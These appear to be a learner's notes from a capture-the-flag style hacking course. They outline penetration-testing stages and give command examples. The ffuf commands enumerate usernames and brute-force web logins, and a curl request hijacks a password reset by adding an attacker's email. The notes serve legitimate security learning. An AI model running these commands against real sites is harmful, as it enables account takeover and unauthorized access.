## General Notes

### Hacking Stages
1. *Information Gathering* - Conducting open-Source intelligence (OSINT), social engineering, and darkweb research.
2. *Enumeration/Scanning* - Discovering running hosts, services and applications that could have vulnerabilities.
3. *Exploitation* - Leveraging the vulnerabilities using research, metasploit or other tool to gain a foothold on the system.
4. *Privilege Escalation* - Expand access by getting root or other method of accessing the desired objective beyond the current user account/permission set.
5. *Post-exploitation* - Pivoting to other targets, gaining additional information as a privileged user, covering tracks and reporting the results

### Knowledge Tidbits
* `find` and `locate` are useful Linux tools for finding files.
> `find -name "flag*"` will find all files that begin with the text flag.
> `find /usr -type d -name "secret"` will find all directories in \usr that are named secret.

* ffuf, dirb, and gobuster are web discovery automation tools that take common wordlists. They can discover directories, files, usernames, or subdomains.
> For example, `gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt` will enumerate the directories/files on the target web server.

> `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists` will return a list of valid usernames if the site provides a message.

> `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200` will brute force a web login.

* curl is a flexible web requesting tool for all kinds of purposes
> For example, `curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'` will reset an account specifying the hacker's email address.

* Sublist3r is a Python subdomain discovery tool.
> For example, `python sublist3r.py -b -d example.com` will enumerate subdomains using the bruteforce module.

* Telnet can work with cleartext application protocols such as FTP, HTTP, IMAP, POP3, IMAP, and SMTP.
> For example, `telnet 10.10.194.41 110` will allow you to connect to POP3 server.
